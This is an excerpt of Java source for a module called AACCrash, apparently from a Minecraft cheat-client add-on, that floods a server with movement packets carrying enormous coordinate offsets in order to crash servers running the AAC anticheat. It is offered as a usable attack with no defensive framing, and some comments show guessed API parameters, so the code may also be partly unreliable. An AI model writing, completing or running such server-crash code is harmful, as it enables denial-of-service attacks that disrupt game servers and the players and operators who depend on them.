...
public class AACCrash extends Module {
    ...
    public AACCrash() {
        super(Saturn.Crash, "AAC-crash", "Supposed crash methods for servers using AAC.");
    }
            ...
            switch (crashMode.get()) {
                case NEW -> {
                    for (double i = 0; i < amount.get(); i++) {
                        // Added the required fifth boolean parameter
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                                mc.player.getX() + (9412 * i),
                                mc.player.getY() + (9412 * i),
                                mc.player.getZ() + (9412 * i),
                                true, // onGround state
                                false // Assuming false for the second boolean parameter
                        ));
                    }
                }
                case OTHER -> {
                ...
                case OLD -> mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
